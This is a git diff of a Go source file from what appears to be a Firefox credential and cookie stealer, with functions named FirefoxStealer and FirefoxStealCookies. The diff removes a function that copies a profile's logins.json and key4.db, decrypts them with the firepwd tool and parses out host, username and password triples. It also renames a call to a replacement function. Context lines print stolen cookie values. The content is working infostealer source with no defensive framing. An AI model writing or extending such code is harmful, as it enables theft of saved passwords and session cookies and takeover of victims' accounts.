@@ -5,7 +5,6 @@ import (
 	"database/sql"
 	"fmt"
 	"os"
-	"io"
 	"io/ioutil"
 	"strings"
 	"log"
@@ -47,70 +46,6 @@ func getActiveProfilePath() (string, error) {
     path = filepath.Join(path, activeDir)
 
     return path, nil
-}
-
-// FirefoxCrackCredentials extracts login credentials from a Firefox profile at the provided path.
-// Returns a slice of Credential structs containing the host, username, and password for each login.
-func FirefoxCrackCredentials(profilePath string) ([]Credential, error) {
-	var credentials []Credential
-
-	// Create directory to store profile files
-	os.MkdirAll("profile", 0755)
-	
-	// Copy required profile files from source to destination
-	srcFiles := []string{profilePath + "\\logins.json", profilePath + "\\key4.db"}
-	dstFiles := []string{"./profile/logins.json", "./profile/key4.db"}
-	for i, srcFile := range srcFiles {
-		dstFile := dstFiles[i]
-		src, err := os.Open(srcFile)
-		if err != nil {
-			return credentials, fmt.Errorf("failed to open %s: %s", srcFile, err)
-		}
-		defer src.Close()
-		
-		dst, err := os.Create(dstFile)
-		if err != nil {
-			return credentials, fmt.Errorf("failed to create %s: %s", dstFile, err)
-		}
-		defer dst.Close()
-		
-		_, err = io.Copy(dst, src)
-		if err != nil {
-			return credentials, fmt.Errorf("failed to copy %s to %s: %s", srcFile, dstFile, err)
-		}
-	}
-	
-	// Run firepwd to decrypt the profile, make sure you have cloned the submodule
-	// And install its required dependencies
-	output, err := CmdOut("py firepwd/firepwd.py -d profile/")
-	if err != nil{
-		return credentials, fmt.Errorf("failed to run firepwd : %s", err)
-	}
-	
-	// Parse output to extract login credentials
-	credsStart := strings.Index(output, "decrypting login/password pairs")
-	if credsStart < 0 {
-		// No login credentials found
-		return credentials, fmt.Errorf("No credential is found")
-	}
-	credsStr := output[credsStart+len("decrypting login/password pairs"):]
-
-	for _, cred := range strings.Split(credsStr, "\n") {
-		cred = strings.TrimSpace(cred)
-		if cred == "" {
-			continue
-		}
-		parts := strings.Split(cred, ":b")
-		values := strings.Split(parts[1], ",b")
-		if len(parts) < 2 {
-			continue
-		}
-		host := strings.TrimSpace(parts[0])
-		username := strings.TrimSpace(strings.ReplaceAll(values[0], "'", ""))
-		password := strings.TrimSpace(strings.ReplaceAll(values[1], "'", ""))
-		credentials = append(credentials, Credential{host, username, password})
-	}
-	return credentials, nil
 }
 
 // FirefoxStealCookies extracts cookies with given 'host' from a Firefox cookies sqlite database
@@ -216,7 +151,7 @@ func FirefoxStealer(host string, output string, dumpAll bool, check bool){
 		fmt.Printf("%s @ %s : %s\n", cookie.Host, cookie.Name, cookie.Value)
 	}
 	if check{
-		creds, err := FirefoxCrackCredentials(profilePath)
+		creds, err := FirefoxCrackLoginData(profilePath)
 		if err!= nil{
 			log.Fatal(err)
 		}
